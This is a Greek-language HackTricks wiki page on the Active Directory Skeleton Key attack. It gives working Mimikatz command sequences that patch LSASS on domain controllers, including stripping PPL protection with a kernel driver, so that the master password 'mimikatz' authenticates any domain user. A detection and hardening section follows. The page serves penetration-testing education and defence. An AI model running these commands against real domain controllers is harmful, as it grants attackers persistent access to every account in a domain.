# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

Το **Skeleton Key attack** είναι μια τεχνική που επιτρέπει στους attackers να **παρακάμπτουν το Active Directory authentication** με **εισαγωγή ενός master password** στη διεργασία LSASS κάθε domain controller. Μετά την εισαγωγή, το master password (προεπιλεγμένα **`mimikatz`**) μπορεί να χρησιμοποιηθεί για authentication ως **οποιοσδήποτε domain user**, ενώ τα πραγματικά τους passwords εξακολουθούν να λειτουργούν.<sup>[[1]](#references)[[2]](#references)</sup>

Βασικά facts:

- Απαιτεί **Domain Admin/SYSTEM + SeDebugPrivilege** σε κάθε DC και πρέπει να **εφαρμόζεται ξανά μετά από κάθε reboot**.<sup>[[2]](#references)</sup>
- Κάνει patch στις διαδρομές validation των **NTLM** και **Kerberos RC4 (etype 0x17)**· realms που χρησιμοποιούν μόνο AES ή accounts που επιβάλλουν AES **δεν θα αποδεχτούν το skeleton key**.<sup>[[2]](#references)</sup>
- Μπορεί να προκαλέσει conflict με third‑party LSA authentication packages ή επιπλέον smart‑card / MFA providers.<sup>[[2]](#references)</sup>
- Το Mimikatz module δέχεται το προαιρετικό switch `/letaes`, ώστε να μην τροποποιεί τα Kerberos/AES hooks σε περίπτωση compatibility issues.<sup>[[3]](#references)</sup>

### Execution

Classic, non‑PPL protected LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Αν το **LSASS εκτελείται ως PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), απαιτείται ένας kernel driver για την αφαίρεση της προστασίας πριν από το patching του LSASS:<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Μετά το injection, πραγματοποιήστε authenticate με οποιονδήποτε domain account, αλλά χρησιμοποιήστε τον κωδικό `mimikatz` (ή την τιμή που έχει οριστεί από τον operator). Θυμηθείτε να το επαναλάβετε σε **όλους τους DCs** σε περιβάλλοντα με πολλαπλούς DCs.

## Mitigations

- **Παρακολούθηση logs**
- System **Event ID 7045** (εγκατάσταση service/driver) για unsigned drivers όπως το `mimidrv.sys`.
- **Sysmon**: Event ID 7 (driver load) για το `mimidrv.sys`; Event ID 10 για ύποπτη πρόσβαση στο `lsass.exe` από non-system processes.
- Security **Event ID 4673/4611** για χρήση ευαίσθητων privileges ή anomalies κατά την εγγραφή LSA authentication packages· συσχετίστε τα με απρόσμενα 4624 logons που χρησιμοποιούν RC4 (etype 0x17) από DCs.
- **Hardening του LSASS**
- Διατηρήστε τα **RunAsPPL/Credential Guard/Secure LSASS** ενεργοποιημένα στους DCs, ώστε να αναγκάζετε τους attackers να κάνουν deployment kernel-mode driver (περισσότερο telemetry, δυσκολότερη εκμετάλλευση).
- Απενεργοποιήστε το legacy **RC4** όπου είναι δυνατό· τα Kerberos tickets που περιορίζονται σε AES αποτρέπουν το RC4 hook path που χρησιμοποιείται από το skeleton key.<sup>[[2]](#references)</sup>
- Γρήγορα PowerShell hunts:
- Εντοπισμός unsigned kernel driver installs: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Hunt για τον Mimikatz driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Επιβεβαίωση ότι το PPL επιβάλλεται μετά το reboot: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Για πρόσθετες οδηγίες σχετικά με το credential-hardening, ανατρέξτε στο [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Αναφορές

- [1] [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
